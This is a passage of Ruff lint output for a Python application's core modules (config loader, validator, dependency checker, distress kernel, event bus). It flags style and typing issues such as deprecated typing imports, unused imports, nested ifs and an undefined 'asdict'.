26 | from datetime import datetime
27 | from pathlib import Path
28 | from typing import Any, Callable, Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
29 |
30 | import yaml
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> src\app\core\config_loader.py:28:1
   |
26 | from datetime import datetime
27 | from pathlib import Path
28 | from typing import Any, Callable, Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
29 |
30 | import yaml
   |

UP045 [*] Use `X | None` for type annotations
  --> src\app\core\config_loader.py:67:21
   |
65 |     def __init__(
66 |         self,
67 |         config_dir: Optional[Path] = None,
   |                     ^^^^^^^^^^^^^^
68 |         backup_dir: Optional[Path] = None,
69 |         watch_poll_sec: int = DEFAULT_WATCH_POLL_SEC,
   |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
  --> src\app\core\config_loader.py:68:21
   |
66 |         self,
67 |         config_dir: Optional[Path] = None,
68 |         backup_dir: Optional[Path] = None,
   |                     ^^^^^^^^^^^^^^
69 |         watch_poll_sec: int = DEFAULT_WATCH_POLL_SEC,
70 |     ):
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\core\config_loader.py:84:23
   |
83 |         # Configuration state
84 |         self.configs: Dict[str, Dict[str, Any]] = {}
   |                       ^^^^
85 |         self.file_hashes: Dict[str, str] = {}
86 |         self.lock = threading.Lock()
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\core\config_loader.py:84:33
   |
83 |         # Configuration state
84 |         self.configs: Dict[str, Dict[str, Any]] = {}
   |                                 ^^^^
85 |         self.file_hashes: Dict[str, str] = {}
86 |         self.lock = threading.Lock()
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\core\config_loader.py:85:27
   |
83 |         # Configuration state
84 |         self.configs: Dict[str, Dict[str, Any]] = {}
85 |         self.file_hashes: Dict[str, str] = {}
   |                           ^^^^
86 |         self.lock = threading.Lock()
   |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
  --> src\app\core\config_loader.py:96:32
   |
95 |         # Reload callbacks
96 |         self.reload_callbacks: List[Callable[[str, Dict[str, Any]], None]] = []
   |                                ^^^^
97 |
98 |         # Error aggregation
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\core\config_loader.py:96:52
   |
95 |         # Reload callbacks
96 |         self.reload_callbacks: List[Callable[[str, Dict[str, Any]], None]] = []
   |                                                    ^^^^
97 |
98 |         # Error aggregation
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\core\config_loader.py:139:45
    |
137 |         return backup_file
138 |
139 |     def _validate_config(self, config_data: Dict[str, Any], config_name: str) -> bool:
    |                                             ^^^^
140 |         """
141 |         Validate configuration data.
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> src\app\core\config_loader.py:180:54
    |
178 |             return False
179 |
180 |     def _load_config_file(self, config_name: str) -> Optional[Dict[str, Any]]:
    |                                                      ^^^^^^^^^^^^^^^^^^^^^^^^
181 |         """
182 |         Load a single configuration file.
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\core\config_loader.py:180:63
    |
178 |             return False
179 |
180 |     def _load_config_file(self, config_name: str) -> Optional[Dict[str, Any]]:
    |                                                               ^^^^
181 |         """
182 |         Load a single configuration file.
    |
help: Replace with `dict`

UP015 [*] Unnecessary mode argument
   --> src\app\core\config_loader.py:197:36
    |
196 |         try:
197 |             with open(config_file, "r") as f:
    |                                    ^^^
198 |                 config_data = yaml.safe_load(f)
    |
help: Remove mode argument

F841 Local variable `old_config` is assigned to but never used
   --> src\app\core\config_loader.py:252:17
    |
250 |             # Update configuration
251 |             with self.lock:
252 |                 old_config = self.configs.get(config_name)
    |                 ^^^^^^^^^^
253 |                 self.configs[config_name] = new_config
    |
help: Remove assignment to unused variable `old_config`

UP045 [*] Use `X | None` for type annotations
   --> src\app\core\config_loader.py:310:48
    |
308 |             return False
309 |
310 |     def _watcher_thread(self, reload_callback: Optional[Callable] = None):
    |                                                ^^^^^^^^^^^^^^^^^^
311 |         """
312 |         Configuration file watcher thread.
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> src\app\core\config_loader.py:355:38
    |
353 |                     pass
354 |
355 |     def watch(self, reload_callback: Optional[Callable] = None):
    |                                      ^^^^^^^^^^^^^^^^^^
356 |         """
357 |         Start watching configuration files for changes.
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\core\config_loader.py:390:61
    |
388 |         logger.info("Config watcher stopped")
389 |
390 |     def get(self, config_name: str, default: Any = None) -> Dict[str, Any]:
    |                                                             ^^^^
391 |         """
392 |         Get configuration by name.
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\core\config_loader.py:460:28
    |
458 |         return success_count
459 |
460 |     def get_stats(self) -> Dict[str, Any]:
    |                            ^^^^
461 |         """
462 |         Get configuration loader statistics.
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> src\app\core\config_loader.py:485:24
    |
484 | # Global configuration loader instance
485 | _global_config_loader: Optional[ConfigLoader] = None
    |                        ^^^^^^^^^^^^^^^^^^^^^^
    |
help: Convert to `X | None`

F402 Import `field` from line 10 shadowed by loop variable
   --> src\app\core\config_validator.py:128:13
    |
126 |         # Required top-level fields
127 |         required_fields = ["subsystems"]
128 |         for field in required_fields:
    |             ^^^^^
129 |             if field not in config:
130 |                 result.is_valid = False
    |

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\core\config_validator.py:145:9
    |
144 |           # Validate optional fields
145 | /         if "discovery_paths" in config:
146 | |             if not isinstance(config["discovery_paths"], list):
    | |_______________________________________________________________^
147 |                   result.warnings.append("'discovery_paths' should be a list")
    |
help: Combine `if` statements using `and`

F402 Import `field` from line 10 shadowed by loop variable
   --> src\app\core\config_validator.py:169:13
    |
167 |         # Required fields for subsystem definition
168 |         required_fields = ["name", "module_path", "class_name"]
169 |         for field in required_fields:
    |             ^^^^^
170 |             if field not in definition:
171 |                 result.is_valid = False
    |

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\core\config_validator.py:187:9
    |
186 |           # Validate dependencies if present
187 | /         if "dependencies" in definition:
188 | |             if not isinstance(definition["dependencies"], list):
    | |________________________________________________________________^
189 |                   result.is_valid = False
190 |                   result.errors.append(
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\core\config_validator.py:195:9
    |
194 |           # Validate config if present
195 | /         if "config" in definition:
196 | |             if not isinstance(definition["config"], dict):
    | |__________________________________________________________^
197 |                   result.is_valid = False
198 |                   result.errors.append(
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\core\config_validator.py:209:9
    |
207 |           # For example, specific fields for certain subsystems
208 |
209 | /         if subsystem_id.endswith("_engine"):
210 | |             # Engine subsystems might require specific fields
211 | |             if "timeout" in config and not isinstance(config["timeout"], (int, float)):
    | |_______________________________________________________________________________________^
212 |                   result.is_valid = False
213 |                   result.errors.append(
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\core\config_validator.py:217:9
    |
215 |                   )
216 |
217 | /         if "model" in config:
218 | |             # Validate model configurations
219 | |             if not isinstance(config["model"], (str, dict)):
    | |____________________________________________________________^
220 |                   result.is_valid = False
221 |                   result.errors.append(
    |
help: Combine `if` statements using `and`

F402 Import `field` from line 10 shadowed by loop variable
   --> src\app\core\config_validator.py:293:13
    |
291 |         }
292 |
293 |         for field, expected_type in type_checks.items():
    |             ^^^^^
294 |             if field in config:
295 |                 if not isinstance(config[field], expected_type):
    |

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\core\config_validator.py:294:13
    |
293 |           for field, expected_type in type_checks.items():
294 | /             if field in config:
295 | |                 if not isinstance(config[field], expected_type):
    | |________________________________________________________________^
296 |                       result.is_valid = False
297 |                       type_name = (
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\core\config_validator.py:350:13
    |
348 |           if "camera" in config:
349 |               camera_config = config["camera"]
350 | /             if "auto_discover" in camera_config:
351 | |                 if not isinstance(camera_config["auto_discover"], bool):
    | |________________________________________________________________________^
352 |                       result.is_valid = False
353 |                       result.errors.append("camera.auto_discover must be a boolean")
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\core\config_validator.py:358:13
    |
356 |           if "storage" in config:
357 |               storage_config = config["storage"]
358 | /             if "base_directory" in storage_config:
359 | |                 if not isinstance(storage_config["base_directory"], str):
    | |_________________________________________________________________________^
360 |                       result.is_valid = False
361 |                       result.errors.append("storage.base_directory must be a string")
    |
help: Combine `if` statements using `and`

F402 Import `field` from line 10 shadowed by loop variable
   --> src\app\core\config_validator.py:397:17
    |
395 |         for subsystem_id, subsystem_config in subsystems.items():
396 |             required_fields = ["name", "version", "priority"]
397 |             for field in required_fields:
    |                 ^^^^^
398 |                 if field not in subsystem_config:
399 |                     result.warnings.append(
    |

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> src\app\core\dependency_checker_robust.py:14:1
   |
12 | import sys
13 | from dataclasses import dataclass
14 | from typing import Dict, List, Optional, Tuple
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
15 |
16 | logger = logging.getLogger(__name__)
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> src\app\core\dependency_checker_robust.py:14:1
   |
12 | import sys
13 | from dataclasses import dataclass
14 | from typing import Dict, List, Optional, Tuple
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
15 |
16 | logger = logging.getLogger(__name__)
   |

UP035 `typing.Tuple` is deprecated, use `tuple` instead
  --> src\app\core\dependency_checker_robust.py:14:1
   |
12 | import sys
13 | from dataclasses import dataclass
14 | from typing import Dict, List, Optional, Tuple
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
15 |
16 | logger = logging.getLogger(__name__)
   |

F401 [*] `typing.List` imported but unused
  --> src\app\core\dependency_checker_robust.py:14:26
   |
12 | import sys
13 | from dataclasses import dataclass
14 | from typing import Dict, List, Optional, Tuple
   |                          ^^^^
15 |
16 | logger = logging.getLogger(__name__)
   |
help: Remove unused import: `typing.List`

UP045 [*] Use `X | None` for type annotations
  --> src\app\core\dependency_checker_robust.py:23:18
   |
21 |     """Version constraint specification."""
22 |
23 |     min_version: Optional[str] = None
   |                  ^^^^^^^^^^^^^
24 |     max_version: Optional[str] = None
25 |     exact_version: Optional[str] = None
   |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
  --> src\app\core\dependency_checker_robust.py:24:18
   |
23 |     min_version: Optional[str] = None
24 |     max_version: Optional[str] = None
   |                  ^^^^^^^^^^^^^
25 |     exact_version: Optional[str] = None
26 |     feature_flag: Optional[str] = None
   |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
  --> src\app\core\dependency_checker_robust.py:25:20
   |
23 |     min_version: Optional[str] = None
24 |     max_version: Optional[str] = None
25 |     exact_version: Optional[str] = None
   |                    ^^^^^^^^^^^^^
26 |     feature_flag: Optional[str] = None
27 |     required: bool = False
   |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
  --> src\app\core\dependency_checker_robust.py:26:19
   |
24 |     max_version: Optional[str] = None
25 |     exact_version: Optional[str] = None
26 |     feature_flag: Optional[str] = None
   |                   ^^^^^^^^^^^^^
27 |     required: bool = False
   |
help: Convert to `X | None`

UP006 [*] Use `tuple` instead of `Tuple` for type annotation
  --> src\app\core\dependency_checker_robust.py:30:40
   |
30 | def parse_version(version_str: str) -> Tuple[int, ...]:
   |                                        ^^^^^
31 |     """
32 |     Parse version string into tuple of integers.
   |
help: Replace with `tuple`

UP045 [*] Use `X | None` for type annotations
  --> src\app\core\dependency_checker_robust.py:75:45
   |
75 | def get_module_version(module_name: str) -> Optional[str]:
   |                                             ^^^^^^^^^^^^^
76 |     """
77 |     Get version of an installed module.
   |
help: Convert to `X | None`

UP006 [*] Use `tuple` instead of `Tuple` for type annotation
   --> src\app\core\dependency_checker_robust.py:113:6
    |
111 | def check_dependency(
112 |     module_name: str, constraint: VersionConstraint
113 | ) -> Tuple[bool, str, Optional[str]]:
    |      ^^^^^
114 |     """
115 |     Check if a dependency meets version constraints.
    |
help: Replace with `tuple`

UP045 [*] Use `X | None` for type annotations
   --> src\app\core\dependency_checker_robust.py:113:23
    |
111 | def check_dependency(
112 |     module_name: str, constraint: VersionConstraint
113 | ) -> Tuple[bool, str, Optional[str]]:
    |                       ^^^^^^^^^^^^^
114 |     """
115 |     Check if a dependency meets version constraints.
    |
help: Convert to `X | None`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\core\dependency_checker_robust.py:158:5
    |
157 |       # Check minimum version
158 | /     if constraint.min_version:
159 | |         if compare_versions(installed_version, constraint.min_version) < 0:
    | |___________________________________________________________________________^
160 |               return (
161 |                   False,
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\core\dependency_checker_robust.py:167:5
    |
166 |       # Check maximum version
167 | /     if constraint.max_version:
168 | |         if compare_versions(installed_version, constraint.max_version) > 0:
    | |___________________________________________________________________________^
169 |               return (
170 |                   False,
    |
help: Combine `if` statements using `and`

UP006 [*] Use `tuple` instead of `Tuple` for type annotation
   --> src\app\core\dependency_checker_robust.py:183:60
    |
183 | def check_python_version(constraint: VersionConstraint) -> Tuple[bool, str]:
    |                                                            ^^^^^
184 |     """
185 |     Check Python interpreter version.
    |
help: Replace with `tuple`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\core\dependency_checker_robust.py:208:5
    |
207 |       # Check minimum version
208 | /     if constraint.min_version:
209 | |         if compare_versions(python_version, constraint.min_version) < 0:
    | |________________________________________________________________________^
210 |               return (
211 |                   False,
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\core\dependency_checker_robust.py:216:5
    |
215 |       # Check maximum version
216 | /     if constraint.max_version:
217 | |         if compare_versions(python_version, constraint.max_version) > 0:
    | |________________________________________________________________________^
218 |               return (
219 |                   False,
    |
help: Combine `if` statements using `and`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\core\dependency_checker_robust.py:227:20
    |
226 | def check_all_dependencies(
227 |     required_deps: Dict[str, VersionConstraint],
    |                    ^^^^
228 |     optional_deps: Dict[str, VersionConstraint],
229 | ) -> Dict:
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\core\dependency_checker_robust.py:228:20
    |
226 | def check_all_dependencies(
227 |     required_deps: Dict[str, VersionConstraint],
228 |     optional_deps: Dict[str, VersionConstraint],
    |                    ^^^^
229 | ) -> Dict:
230 |     """
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\core\dependency_checker_robust.py:229:6
    |
227 |     required_deps: Dict[str, VersionConstraint],
228 |     optional_deps: Dict[str, VersionConstraint],
229 | ) -> Dict:
    |      ^^^^
230 |     """
231 |     Check all dependencies and return detailed report.
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\core\dependency_checker_robust.py:318:48
    |
318 | def load_dependencies_from_config(config_dict: Dict) -> Tuple[Dict, Dict]:
    |                                                ^^^^
319 |     """
320 |     Load dependency constraints from configuration.
    |
help: Replace with `dict`

UP006 [*] Use `tuple` instead of `Tuple` for type annotation
   --> src\app\core\dependency_checker_robust.py:318:57
    |
318 | def load_dependencies_from_config(config_dict: Dict) -> Tuple[Dict, Dict]:
    |                                                         ^^^^^
319 |     """
320 |     Load dependency constraints from configuration.
    |
help: Replace with `tuple`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\core\dependency_checker_robust.py:318:63
    |
318 | def load_dependencies_from_config(config_dict: Dict) -> Tuple[Dict, Dict]:
    |                                                               ^^^^
319 |     """
320 |     Load dependency constraints from configuration.
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\core\dependency_checker_robust.py:318:69
    |
318 | def load_dependencies_from_config(config_dict: Dict) -> Tuple[Dict, Dict]:
    |                                                                     ^^^^
319 |     """
320 |     Load dependency constraints from configuration.
    |
help: Replace with `dict`

F401 [*] `base64` imported but unused
  --> src\app\core\distress_kernel.py:38:8
   |
36 | """
37 |
38 | import base64
   |        ^^^^^^
39 | import hashlib
40 | import json
   |
help: Remove unused import: `base64`

F401 [*] `hashlib` imported but unused
  --> src\app\core\distress_kernel.py:39:8
   |
38 | import base64
39 | import hashlib
   |        ^^^^^^^
40 | import json
41 | import logging
   |
help: Remove unused import: `hashlib`

F401 [*] `os` imported but unused
  --> src\app\core\distress_kernel.py:42:8
   |
40 | import json
41 | import logging
42 | import os
   |        ^^
43 | import threading
44 | import time
   |
help: Remove unused import: `os`

F401 [*] `abc.ABC` imported but unused
  --> src\app\core\distress_kernel.py:46:17
   |
44 | import time
45 | import uuid
46 | from abc import ABC, abstractmethod
   |                 ^^^
47 | from collections import defaultdict
48 | from dataclasses import dataclass, field
   |
help: Remove unused import

F401 [*] `abc.abstractmethod` imported but unused
  --> src\app\core\distress_kernel.py:46:22
   |
44 | import time
45 | import uuid
46 | from abc import ABC, abstractmethod
   |                      ^^^^^^^^^^^^^^
47 | from collections import defaultdict
48 | from dataclasses import dataclass, field
   |
help: Remove unused import

F401 [*] `collections.defaultdict` imported but unused
  --> src\app\core\distress_kernel.py:47:25
   |
45 | import uuid
46 | from abc import ABC, abstractmethod
47 | from collections import defaultdict
   |                         ^^^^^^^^^^^
48 | from dataclasses import dataclass, field
49 | from datetime import datetime
   |
help: Remove unused import: `collections.defaultdict`

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> src\app\core\distress_kernel.py:50:1
   |
48 | from dataclasses import dataclass, field
49 | from datetime import datetime
50 | from typing import Any, Dict, List, Optional, Protocol, Tuple
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
51 |
52 | logger = logging.getLogger(__name__)
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> src\app\core\distress_kernel.py:50:1
   |
48 | from dataclasses import dataclass, field
49 | from datetime import datetime
50 | from typing import Any, Dict, List, Optional, Protocol, Tuple
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
51 |
52 | logger = logging.getLogger(__name__)
   |

UP035 `typing.Tuple` is deprecated, use `tuple` instead
  --> src\app\core\distress_kernel.py:50:1
   |
48 | from dataclasses import dataclass, field
49 | from datetime import datetime
50 | from typing import Any, Dict, List, Optional, Protocol, Tuple
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
51 |
52 | logger = logging.getLogger(__name__)
   |

F401 [*] `typing.Tuple` imported but unused
  --> src\app\core\distress_kernel.py:50:57
   |
48 | from dataclasses import dataclass, field
49 | from datetime import datetime
50 | from typing import Any, Dict, List, Optional, Protocol, Tuple
   |                                                         ^^^^^
51 |
52 | logger = logging.getLogger(__name__)
   |
help: Remove unused import: `typing.Tuple`

UP045 [*] Use `X | None` for type annotations
  --> src\app\core\distress_kernel.py:63:48
   |
62 |     def deny(
63 |         self, doc: str, reason: str, metadata: Optional[Dict[str, Any]] = None
   |                                                ^^^^^^^^^^^^^^^^^^^^^^^^
64 |     ) -> str:
65 |         """Store denied content and return vault ID."""
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\core\distress_kernel.py:63:57
   |
62 |     def deny(
63 |         self, doc: str, reason: str, metadata: Optional[Dict[str, Any]] = None
   |                                                         ^^^^
64 |     ) -> str:
65 |         """Store denied content and return vault ID."""
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\core\distress_kernel.py:75:15
   |
73 |         self,
74 |         event_type: str,
75 |         data: Dict[str, Any],
   |               ^^^^
76 |         actor: str,
77 |         description: str,
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
  --> src\app\core\distress_kernel.py:78:19
   |
76 |         actor: str,
77 |         description: str,
78 |         trace_id: Optional[str] = None,
   |                   ^^^^^^^^^^^^^
79 |     ) -> bool:
80 |         """Log audit event with trace context."""
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\core\distress_kernel.py:87:40
   |
85 |     """Error aggregator interface for centralized error handling."""
86 |
87 |     def log(self, exc: Exception, ctx: Dict[str, Any]):
   |                                        ^^^^
88 |         """Log an error with context."""
89 |         ...
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
  --> src\app\core\distress_kernel.py:91:58
   |
89 |         ...
90 |
91 |     def flush_to_vault(self, vault: IVault, doc: str) -> Optional[str]:
   |                                                          ^^^^^^^^^^^^^
92 |         """Flush aggregated errors to vault."""
93 |         ...
   |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\core\distress_kernel.py:136:23
    |
134 |             return
135 |
136 |         self.entries: List[Dict[str, Any]] = []
    |                       ^^^^
137 |         self.entry_lock = threading.Lock()
138 |         self.overflow_count = 0
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\core\distress_kernel.py:136:28
    |
134 |             return
135 |
136 |         self.entries: List[Dict[str, Any]] = []
    |                            ^^^^
137 |         self.entry_lock = threading.Lock()
138 |         self.overflow_count = 0
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\core\distress_kernel.py:143:40
    |
141 |         logger.info("GlobalErrorAggregator singleton initialized")
142 |
143 |     def log(self, exc: Exception, ctx: Dict[str, Any]):
    |                                        ^^^^
144 |         """
145 |         Log an error with context.
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> src\app\core\distress_kernel.py:218:58
    |
216 |             return json.dumps(self.entries, indent=2)
217 |
218 |     def flush_to_vault(self, vault: IVault, doc: str) -> Optional[str]:
    |                                                          ^^^^^^^^^^^^^
219 |         """
220 |         Flush aggregated errors to vault.
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\core\distress_kernel.py:264:28
    |
262 |             return vault_id
263 |
264 |     def get_stats(self) -> Dict[str, Any]:
    |                            ^^^^
265 |         """Get aggregator statistics."""
266 |         with self.entry_lock:
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\core\distress_kernel.py:328:28
    |
326 |             logger.debug(f"Retry counter reset (count: {self.reset_count})")
327 |
328 |     def get_stats(self) -> Dict[str, Any]:
    |                            ^^^^
329 |         """Get retry statistics."""
330 |         with self.lock:
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> src\app\core\distress_kernel.py:367:11
    |
366 | def forbidden_validator(
367 |     text: Optional[str], forbidden_phrases: List[str], context: SignalContext
    |           ^^^^^^^^^^^^^
368 | ) -> None:
369 |     """
    |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\core\distress_kernel.py:367:45
    |
366 | def forbidden_validator(
367 |     text: Optional[str], forbidden_phrases: List[str], context: SignalContext
    |                                             ^^^^
368 | ) -> None:
369 |     """
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\core\distress_kernel.py:547:13
    |
546 | def process_signal(
547 |     signal: Dict[str, Any],
    |             ^^^^
548 |     is_incident: bool = False,
549 |     vault: Optional[IVault] = None,
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> src\app\core\distress_kernel.py:549:12
    |
547 |     signal: Dict[str, Any],
548 |     is_incident: bool = False,
549 |     vault: Optional[IVault] = None,
    |            ^^^^^^^^^^^^^^^^
550 |     audit: Optional[IAuditLog] = None,
551 | ) -> Dict[str, Any]:
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> src\app\core\distress_kernel.py:550:12
    |
548 |     is_incident: bool = False,
549 |     vault: Optional[IVault] = None,
550 |     audit: Optional[IAuditLog] = None,
    |            ^^^^^^^^^^^^^^^^^^^
551 | ) -> Dict[str, Any]:
552 |     """
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\core\distress_kernel.py:551:6
    |
549 |     vault: Optional[IVault] = None,
550 |     audit: Optional[IAuditLog] = None,
551 | ) -> Dict[str, Any]:
    |      ^^^^
552 |     """
553 |     Process signal through distress/incident kernel.
    |
help: Replace with `dict`

E722 Do not use bare `except`
   --> src\app\core\distributed_cluster_coordinator.py:278:9
    |
276 |         try:
277 |             self.ip_address = socket.gethostbyname(self.hostname)
278 |         except:
    |         ^^^^^^
279 |             self.ip_address = "127.0.0.1"
    |

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\core\distributed_cluster_coordinator.py:444:17
    |
443 |                   time_since_heartbeat = current_time - node_info.last_heartbeat
444 | /                 if time_since_heartbeat > self.node_timeout:
445 | |                     if node_info.state != NodeState.OFFLINE:
    | |____________________________________________________________^
446 |                           logger.warning(
447 |                               "Node %s timed out (no heartbeat for %ss)",
    |
help: Combine `if` statements using `and`

UP015 [*] Unnecessary mode argument
   --> src\app\core\domain_base.py:262:39
    |
260 |         if state_file.exists():
261 |             try:
262 |                 with open(state_file, "r") as file:
    |                                       ^^^
263 |                     state = json.load(file)
264 |                     self._restore_state(state)
    |
help: Remove mode argument

B007 Loop control variable `info` not used within loop body
   --> src\app\core\enhanced_bootstrap.py:219:27
    |
217 |         graph = {}
218 |
219 |         for subsystem_id, info in self._subsystem_metadata.items():
    |                           ^^^^
220 |             in_degree[subsystem_id] = 0
221 |             graph[subsystem_id] = []
    |
help: Rename unused `info` to `_info`

F401 [*] `datetime.datetime` imported but unused
  --> src\app\core\error_aggregator.py:21:22
   |
19 | import threading
20 | import time
21 | from datetime import datetime
   |                      ^^^^^^^^
22 | from typing import Any, Dict, List, Optional
   |
help: Remove unused import: `datetime.datetime`

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> src\app\core\error_aggregator.py:22:1
   |
20 | import time
21 | from datetime import datetime
22 | from typing import Any, Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
23 |
24 | logger = logging.getLogger(__name__)
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> src\app\core\error_aggregator.py:22:1
   |
20 | import time
21 | from datetime import datetime
22 | from typing import Any, Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
23 |
24 | logger = logging.getLogger(__name__)
   |

UP006 [*] Use `list` instead of `List` for type annotation
  --> src\app\core\error_aggregator.py:47:23
   |
45 |     def __init__(self):
46 |         """Initialize error aggregator."""
47 |         self.entries: List[Dict[str, Any]] = []
   |                       ^^^^
48 |         self.lock = threading.Lock()
49 |         self.overflow_count = 0
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\core\error_aggregator.py:47:28
   |
45 |     def __init__(self):
46 |         """Initialize error aggregator."""
47 |         self.entries: List[Dict[str, Any]] = []
   |                            ^^^^
48 |         self.lock = threading.Lock()
49 |         self.overflow_count = 0
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\core\error_aggregator.py:51:40
   |
49 |         self.overflow_count = 0
50 |
51 |     def log(self, exc: Exception, ctx: Dict[str, Any]):
   |                                        ^^^^
52 |         """
53 |         Log an error with context.
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\core\error_aggregator.py:164:28
    |
162 |             return vault_id
163 |
164 |     def get_stats(self) -> Dict[str, Any]:
    |                            ^^^^
165 |         """
166 |         Get aggregator statistics.
    |
help: Replace with `dict`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\core\event_spine.py:256:17
    |
254 |               # Remove from category index
255 |               for category in subscription.categories:
256 | /                 if category in self._subscriptions_by_category:
257 | |                     if subscriber_id in self._subscriptions_by_category[category]:
    | |__________________________________________________________________________________^
258 |                           self._subscriptions_by_category[category].remove(subscriber_id)
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\core\event_spine.py:481:9
    |
479 |           """
480 |           # Check priority filter
481 | /         if subscription.priority_filter:
482 | |             if event.priority not in subscription.priority_filter:
    | |__________________________________________________________________^
483 |                   return False
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\core\event_spine.py:486:9
    |
485 |           # Check source filter
486 | /         if subscription.source_filter:
487 | |             if event.source_domain not in subscription.source_filter:
    | |_____________________________________________________________________^
488 |                   return False
    |
help: Combine `if` statements using `and`

F821 Undefined name `asdict`
   --> src\app\core\god_tier_integration.py:541:21
    |
539 |                     text_input,
540 |                     response,
541 |                     asdict(fused_context) if fused_context else {},
    |                     ^^^^^^
542 |                 )
    |

F821 Undefined name `asdict`
   --> src\app\core\god_tier_integration.py:547:34
    |
545 |                 "success": True,
546 |                 "response": response,
